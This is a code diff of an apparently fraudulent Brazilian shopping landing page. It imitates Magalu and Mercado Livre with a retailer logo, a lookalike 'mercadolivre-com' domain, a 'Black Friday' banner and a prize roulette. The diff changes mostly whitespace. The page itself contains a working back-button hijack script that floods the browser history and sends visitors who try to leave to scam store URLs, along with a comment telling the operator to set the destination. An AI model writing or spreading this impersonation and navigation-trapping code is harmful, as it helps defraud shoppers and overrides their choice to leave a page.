@@ -14,18 +14,18 @@
   <script>
     // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
     const link = 'https://mercadolivre-com.vercel.app/';
-  
+
     function setBackRedirect(url) {
       let urlBackRedirect = url;
       urlBackRedirect = urlBackRedirect =
         urlBackRedirect.trim() +
         (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
         document.location.search.replace('?', '').toString();
-  
+
       history.pushState({}, '', location.href);
       history.pushState({}, '', location.href);
       history.pushState({}, '', location.href);
-  
+
       window.addEventListener('popstate', () => {
         console.log('onpopstate', urlBackRedirect);
         setTimeout(() => {
@@ -33,7 +33,7 @@
         }, 1);
       });
     }
-  
+
     setBackRedirect(link);
   </script>
   <!-- Event snippet for form conversion page -->
@@ -44,7 +44,7 @@
         'currency': 'BRL'
     });
   </script>
-  
+
   <script>
     window.pixelId = "672200df5f1c8362a3667689";
     var a = document.createElement("script");
@@ -81,12 +81,12 @@
 </head>
 <body>
     <div class="content">
-        <div style="background-color: #000000; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva: Black Friday</div>
+        <div style="background-color: #000229; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva: Black Friday</div>
         <nav class="navbar" style="padding-top: 15px;">
             <div class="menu-icon" style="padding-left: 3%; display: flex; align-items: center;">
                 <img src="images/logo-magalu-branco-300x89.png" style="height: 5vh;" alt="Logo mercado">
             </div>
-            
+
             <div class="logo-central">
             </div>
             <div class="menu-icon" style="padding-right: 3%;">
@@ -295,10 +295,10 @@
     <script>
         setTimeout(function () {
             var button = document.querySelector("#recompensas");
-            
+
             // Alterando a variável link para a nova URL
             var link = "./roleta/index.html";
-            
+
             button.addEventListener("click", function () {
                 window.location.href = link + window.location.search;
             });
@@ -355,7 +355,7 @@
             }
         }
     </script>
-    
+
     <script>
   // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
   const link = 'https://ofertaspromocional.shop/rl-loja/';
